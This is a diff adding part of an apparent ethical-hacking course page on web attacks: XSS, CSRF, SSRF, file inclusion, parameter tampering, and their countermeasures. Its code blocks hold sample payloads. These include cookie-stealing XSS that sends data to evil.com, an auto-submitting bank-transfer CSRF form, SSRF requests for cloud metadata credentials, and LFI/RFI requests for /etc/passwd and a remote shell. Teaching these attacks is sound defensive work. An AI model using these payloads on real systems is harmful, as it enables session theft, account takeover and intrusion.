+        <div class="section-body">
+            <p>
+                XSS vulnerabilities allow attackers to inject malicious scripts into web pages viewed by
+                other users. Unlike server-side injection attacks, XSS executes in the victim's browser,
+                enabling session theft, keylogging, redirection, credential harvesting, and browser exploitation.
+                XSS affects the integrity of the web page from the victim's perspective.
+            </p>
+
+            <div class="concept-grid">
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#128257;</div>
+                    <div class="concept-card-title">Reflected XSS</div>
+                    <div class="concept-card-body">
+                        Malicious script is included in the URL (query parameter, path). The server reflects
+                        the input back in the response without sanitization. Requires the victim to click a
+                        crafted link. Not stored — executes once. Common in search results, error pages,
+                        and URL-based form submissions.
+                    </div>
+                    <span class="concept-tag">Non-Persistent</span>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#128190;</div>
+                    <div class="concept-card-title">Stored (Persistent) XSS</div>
+                    <div class="concept-card-body">
+                        Malicious script is stored in the database and served to all users who view the
+                        infected page (comments, profile fields, forum posts). No crafted link needed —
+                        every visitor is a victim. Higher severity than reflected. Worm propagation is possible
+                        (Samy worm, 2005: infected 1M MySpace profiles in 20 hours).
+                    </div>
+                    <span class="concept-tag">Persistent</span>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#128203;</div>
+                    <div class="concept-card-title">DOM-Based XSS</div>
+                    <div class="concept-card-body">
+                        Payload never reaches the server. Client-side JavaScript reads attacker-controlled
+                        data (URL fragment, localStorage) and writes it to the DOM unsafely using innerHTML,
+                        document.write, or eval. Traditional server-side filters cannot detect it — requires
+                        client-side code review.
+                    </div>
+                    <span class="concept-tag">Client-Side</span>
+                </div>
+            </div>
+
+            <div class="code-block">
+<span class="comment">// XSS payload examples</span>
+
+<span class="comment">// Basic alert (proof-of-concept)</span>
+<span class="inj">&lt;script&gt;alert(1)&lt;/script&gt;</span>
+
+<span class="comment">// Session theft</span>
+<span class="inj">&lt;script&gt;document.location='https://evil.com/?c='+document.cookie&lt;/script&gt;</span>
+
+<span class="comment">// Event-handler injection (bypasses &lt;script&gt; filters)</span>
+<span class="inj">&lt;img src=x onerror="fetch('https://evil.com/?d='+document.cookie)"&gt;</span>
+
+<span class="comment">// Prevention: Content Security Policy header</span>
+<span class="safe">Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'</span>
+            </div>
+
+            <div class="two-col">
+                <div class="col-card">
+                    <h3>&#128683; XSS Attack Impacts</h3>
+                    <ul>
+                        <li><span class="li-marker">&#9656;</span>Session cookie theft and account takeover</li>
+                        <li><span class="li-marker">&#9656;</span>Credential harvesting via fake login forms</li>
+                        <li><span class="li-marker">&#9656;</span>Keylogging and form field capture</li>
+                        <li><span class="li-marker">&#9656;</span>Browser exploitation (BeEF framework)</li>
+                        <li><span class="li-marker">&#9656;</span>Malware download and drive-by attacks</li>
+                        <li><span class="li-marker">&#9656;</span>Website content modification and defacement</li>
+                    </ul>
+                </div>
+                <div class="col-card">
+                    <h3>&#10003; XSS Countermeasures</h3>
+                    <ul>
+                        <li><span class="li-marker">&#9656;</span>Output encoding: HTML-encode user data before rendering</li>
+                        <li><span class="li-marker">&#9656;</span>Content Security Policy (CSP) blocks inline scripts</li>
+                        <li><span class="li-marker">&#9656;</span>HttpOnly cookie flag prevents JS cookie access</li>
+                        <li><span class="li-marker">&#9656;</span>Input validation and sanitization libraries (DOMPurify)</li>
+                        <li><span class="li-marker">&#9656;</span>X-XSS-Protection header (legacy browsers)</li>
+                        <li><span class="li-marker">&#9656;</span>Avoid dangerous sinks: innerHTML, document.write, eval</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Section 6: Other Web Attacks -->
+    <div class="section" id="s6">
+        <div class="section-number">Section 06</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#128301;</span>
+            Other Web Application Attacks
+        </h2>
+        <div class="section-body">
+            <div class="detail-section">
+                <div class="detail-header" onclick="toggleDetail(this)">
+                    <div class="detail-header-left">
+                        <span class="detail-header-icon">&#128257;</span>
+                        <div>
+                            <div class="detail-header-title">Cross-Site Request Forgery (CSRF)</div>
+                            <div class="detail-header-subtitle">Tricking authenticated users into performing unintended actions</div>
+                        </div>
+                    </div>
+                    <span class="detail-toggle">&#9660;</span>
+                </div>
+                <div class="detail-body">
+                    <p>
+                        CSRF exploits the browser's automatic inclusion of authentication cookies in cross-site
+                        requests. If a victim is authenticated to a web application and visits a malicious page,
+                        the malicious page can trigger state-changing requests (password change, wire transfer,
+                        email change) on the target application — authenticated as the victim.
+                    </p>
+                    <div class="code-block">
+<span class="comment">&lt;!-- Malicious page auto-submitting a hidden form --&gt;</span>
+&lt;form action=<span class="str">"https://bank.com/transfer"</span> method=<span class="str">"POST"</span>&gt;
+  &lt;input type=<span class="str">"hidden"</span> name=<span class="str">"amount"</span> value=<span class="inj">"50000"</span>&gt;
+  &lt;input type=<span class="str">"hidden"</span> name=<span class="str">"to"</span> value=<span class="inj">"attacker-account"</span>&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit();&lt;/script&gt;
+
+<span class="comment">// Defense: CSRF token (synchronized token pattern)</span>
+<span class="safe">&lt;input type="hidden" name="csrf_token" value="r4nd0mT0k3n"&gt;</span>
+                    </div>
+                    <p>
+                        <strong style="color:#c4a0d8;">Countermeasures:</strong> CSRF tokens (unique per-session random values in forms),
+                        SameSite cookie attribute (Lax or Strict prevents cross-site cookie sending),
+                        origin/referer header validation, double-submit cookie pattern.
+                    </p>
+                </div>
+            </div>
+
+            <div class="detail-section">
+                <div class="detail-header" onclick="toggleDetail(this)">
+                    <div class="detail-header-left">
+                        <span class="detail-header-icon">&#127968;</span>
+                        <div>
+                            <div class="detail-header-title">Server-Side Request Forgery (SSRF)</div>
+                            <div class="detail-header-subtitle">Weaponizing the server as an internal request proxy</div>
+                        </div>
+                    </div>
+                    <span class="detail-toggle">&#9660;</span>
+                </div>
+                <div class="detail-body">
+                    <p>
+                        SSRF allows attackers to make the server initiate HTTP requests to internal resources —
+                        bypassing firewall rules that would block direct external access. In cloud environments,
+                        SSRF is critical: AWS, GCP, and Azure expose instance metadata at 169.254.169.254,
+                        returning IAM credentials that can be used to escalate privileges across the cloud account.
+                        The 2019 Capital One breach was enabled by an SSRF vulnerability.
+                    </p>
+                    <div class="code-block">
+<span class="comment"># SSRF to cloud metadata (AWS IMDS)</span>
+GET /fetch?url=<span class="inj">http://169.254.169.254/latest/meta-data/iam/security-credentials/</span>
+
+<span class="comment"># Internal service enumeration via SSRF</span>
+GET /fetch?url=<span class="inj">http://10.0.0.1/admin</span>
+GET /fetch?url=<span class="inj">http://localhost:6379/</span>  <span class="comment"># Redis</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="detail-section">
+                <div class="detail-header" onclick="toggleDetail(this)">
+                    <div class="detail-header-left">
+                        <span class="detail-header-icon">&#128194;</span>
+                        <div>
+                            <div class="detail-header-title">File Inclusion (LFI / RFI)</div>
+                            <div class="detail-header-subtitle">Including arbitrary local or remote files in execution context</div>
+                        </div>
+                    </div>
+                    <span class="detail-toggle">&#9660;</span>
+                </div>
+                <div class="detail-body">
+                    <p>
+                        <strong style="color:#c4a0d8;">Local File Inclusion (LFI)</strong> occurs when a PHP (or similar) include statement
+                        accepts user-controlled input. An attacker can include files from the local filesystem
+                        (/etc/passwd, /var/log/apache/access.log for log poisoning) within the script's execution context.
+                        <strong style="color:#c4a0d8;">Remote File Inclusion (RFI)</strong> allows including files from remote URLs
+                        (requires allow_url_include=On in PHP) — attacker can include a PHP web shell hosted
+                        on a remote server.
+                    </p>
+                    <div class="code-block">
+<span class="comment"># LFI example</span>
+GET /index.php?page=<span class="inj">../../../../etc/passwd</span>
+GET /index.php?page=<span class="inj">../../../../var/log/apache2/access.log</span>
+
+<span class="comment"># RFI example (PHP)</span>
+GET /index.php?page=<span class="inj">http://attacker.com/shell.php</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="detail-section">
+                <div class="detail-header" onclick="toggleDetail(this)">
+                    <div class="detail-header-left">
+                        <span class="detail-header-icon">&#128260;</span>
+                        <div>
+                            <div class="detail-header-title">Parameter Tampering</div>
+                            <div class="detail-header-subtitle">Manipulating application parameters to alter business logic</div>
+                        </div>
+                    </div>
+                    <span class="detail-toggle">&#9660;</span>
+                </div>
+                <div class="detail-body">
+                    <p>
+                        Parameter tampering modifies HTTP request parameters (URL query strings, POST body,
+                        cookies, hidden form fields) to alter application behavior in unintended ways.
+                        Classic examples include changing product prices in e-commerce checkouts, modifying
+                        account IDs in API requests to access other users' data (IDOR — Insecure Direct
+                        Object Reference), and manipulating access level fields in authentication tokens.
+                        Defense: never trust client-supplied parameters for security decisions; validate
+                        all parameters server-side against authoritative state.
+                    </p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Section 7: Countermeasures -->
+    <div class="section" id="s7">
+        <div class="section-number">Section 07</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#128737;</span>
+            Web Attack Countermeasures
+        </h2>
+        <div class="section-body">
+            <div class="concept-grid">
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#128260;</div>
+                    <div class="concept-card-title">Input Validation</div>
+                    <div class="concept-card-body">Validate all input server-side — type, length, format, range. Use allowlist validation (accept only known-good values) rather than denylist filtering (blocking known-bad patterns). Never trust client-side validation alone.</div>
+                    <span class="concept-tag">Prevention</span>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#128201;</div>
+                    <div class="concept-card-title">Parameterized Queries</div>
+                    <div class="concept-card-body">The only reliable SQLi defense. Use prepared statements and parameterized queries in all database interactions. ORMs typically enforce this pattern. Stored procedures provide similar protection when parameterized.</div>
+                    <span class="concept-tag">SQLi Defense</span>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#127759;</div>
+                    <div class="concept-card-title">Web Application Firewall</div>
+                    <div class="concept-card-body">Inspects HTTP/HTTPS traffic for attack signatures. Blocks known exploitation patterns for SQLi, XSS, path traversal, and other OWASP risks. ModSecurity (open-source), AWS WAF, Cloudflare WAF. Supplement to — not substitute for — secure coding.</div>
+                    <span class="concept-tag">Detection Layer</span>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#128274;</div>
+                    <div class="concept-card-title">HTTPS &amp; Security Headers</div>
+                    <div class="concept-card-body">TLS 1.3 for all traffic. Security headers: CSP (block inline scripts), HSTS (force HTTPS), X-Frame-Options (prevent clickjacking), X-Content-Type-Options (prevent MIME sniffing), Referrer-Policy.</div>
+                    <span class="concept-tag">Transport Security</span>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#128196;</div>
+                    <div class="concept-card-title">Secure Coding Practices</div>
+                    <div class="concept-card-body">OWASP ASVS (Application Security Verification Standard) provides a testable security requirements framework. Threat modeling during design. SAST tools in CI/CD pipelines. Dependency scanning for known CVEs (Dependabot, Snyk, OWASP Dependency-Check).</div>
+                    <span class="concept-tag">SDLC</span>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-icon">&#128290;</div>
+                    <div class="concept-card-title">Least Privilege &amp; Isolation</div>
+                    <div class="concept-card-body">Database users should have minimum required permissions. Web application processes should run as non-root accounts. Container isolation (Docker, Kubernetes) limits blast radius. Network segmentation prevents SSRF pivot to internal services.</div>
+                    <span class="concept-tag">Containment</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Section 8: Takeaways & Discussion -->
+    <div class="section" id="s8">
+        <div class="section-number">Section 08</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#9889;</span>
+            Key Takeaways
+        </h2>
+        <div class="section-body">
+            <div class="takeaway-grid">
+                <div class="takeaway-card">
+                    <div class="takeaway-icon">&#128201;</div>
+                    <div class="takeaway-title">Never Concatenate Queries</div>
+                    <div class="takeaway-desc">SQL injection is a solved problem. Parameterized queries eliminate the vulnerability class entirely. There is no justification for building SQL strings from user input in modern code.</div>
+                </div>
+                <div class="takeaway-card">
+                    <div class="takeaway-icon">&#128204;</div>
+                    <div class="takeaway-title">Output Context Determines Encoding</div>
+                    <div class="takeaway-desc">XSS prevention requires encoding user data for its output context — HTML entities in HTML body, JavaScript escaping in script blocks, URL encoding in URLs. One encoding does not fit all contexts.</div>
+                </div>
+                <div class="takeaway-card">
+                    <div class="takeaway-icon">&#127760;</div>
+                    <div class="takeaway-title">SSRF Is Increasingly Critical</div>
+                    <div class="takeaway-desc">In cloud-native environments, SSRF attacks on metadata services can yield IAM credentials with sweeping access. SSRF moved from academic vulnerability to top OWASP risk for good reason.</div>
+                </div>
+                <div class="takeaway-card">
+                    <div class="takeaway-icon">&#128279;</div>
+                    <div class="takeaway-title">Defense in Depth for Applications</div>
+                    <div class="takeaway-desc">Input validation + parameterized queries + WAF + CSP + HSTS + output encoding + least-privilege database accounts + logging. Each layer catches what others miss — no single control is sufficient.</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Discussion -->
+    <div class="section" id="discuss">
+        <div class="discussion-section">
+            <div class="discussion-title">
+                <span>&#128172;</span>
+                Discussion Prompts
+            </div>
+            <ul class="prompt-list">
+                <li class="prompt-item">
+                    <span class="prompt-num">01</span>
+                    SQL injection has been a known vulnerability since 1998 and a parameterized query solution has existed for just as long. Yet it remains consistently in the OWASP Top 10. What organizational, educational, and tooling failures explain its persistence, and what would systemic change actually look like?
+                </li>
+                <li class="prompt-item">
+                    <span class="prompt-num">02</span>
+                    Content Security Policy is one of the most powerful XSS mitigations available, yet adoption among Fortune 500 companies remains below 50%. Walk through the technical and organizational challenges of implementing a strict CSP on a large legacy application without breaking functionality.
+                </li>
+                <li class="prompt-item">
+                    <span class="prompt-num">03</span>
+                    The 2019 Capital One breach involved SSRF exploiting an EC2 instance metadata service to retrieve IAM credentials. How does the AWS IMDSv2 (Instance Metadata Service version 2) address this specific attack vector, and what residual SSRF risks remain even with IMDSv2 enforced?
+                </li>
+                <li class="prompt-item">
+                    <span class="prompt-num">04</span>
+                    Compare the threat model for reflected XSS versus stored XSS from an attacker's perspective: victim delivery mechanism, required user interaction, scalability, and detection probability. In what scenario would an attacker prefer reflected XSS over stored XSS, and vice versa?
+                </li>
+                <li class="prompt-item">
+                    <span class="prompt-num">05</span>
+                    Web Application Firewalls are often marketed as comprehensive web security solutions. Construct three attack scenarios against a target with a WAF deployed that would still succeed, and explain what application-layer controls would be required to address the remaining gaps.
+                </li>
+            </ul>
+        </div>
+    </div>
+
+    <!-- Completion -->
+    <div class="section" id="completion">
+        <div class="completion-section">
+            <div class="completion-icon">&#10003;</div>
+            <h2 class="completion-title">Module Complete</h2>
+            <p class="completion-text">
+                You have covered web server architecture, server-level attack techniques, the OWASP Top 10
+                taxonomy, SQL injection in all its forms, XSS variants and payload mechanics, CSRF, SSRF,
+                file inclusion, and the full countermeasure stack for application-layer security.
+            </p>
+            <button class="completion-btn" onclick="completeModule()">
+                <span>&#10003;</span>
+                Complete Module 07
+            </button>
+        </div>
+    </div>
+
+</main>
+
+<script>
+    // Scroll progress bar
+    function updateScrollProgress() {
+        const scrollTop = window.scrollY;
+        const docHeight = document.documentElement.scrollHeight - window.innerHeight;
+        const pct = docHeight > 0 ? (scrollTop / docHeight) * 100 : 0;
+        document.getElementById('scrollProgress').style.width = pct + '%';
+        document.getElementById('readingFill').style.width = pct + '%';
+    }
+
+    window.addEventListener('scroll', updateScrollProgress, { passive: true });
+
+    // Section fade-in
+    function initScrollAnimation() {
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) entry.target.classList.add('visible');
+            });
+        }, { threshold: 0.08 });
+
+        document.querySelectorAll('.section').forEach(s => observer.observe(s));
+    }
+
+    // Expandable sections
+    function toggleDetail(header) {
+        const body = header.nextElementSibling;
+        const toggle = header.querySelector('.detail-toggle');
+        const isOpen = body.classList.contains('open');
+        body.classList.toggle('open', !isOpen);
+        toggle.classList.toggle('open', !isOpen);
+    }
+
+    // Module completion
+    function completeModule() {
+        if (typeof ModuleProgress !== 'undefined') {
+            ModuleProgress.complete('dark-arts', 'ehe-07', {
+                returnUrl: '../index.html'
+            });
+        }
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+        initScrollAnimation();
+    });
+</script>
+
+</body>
+</html>
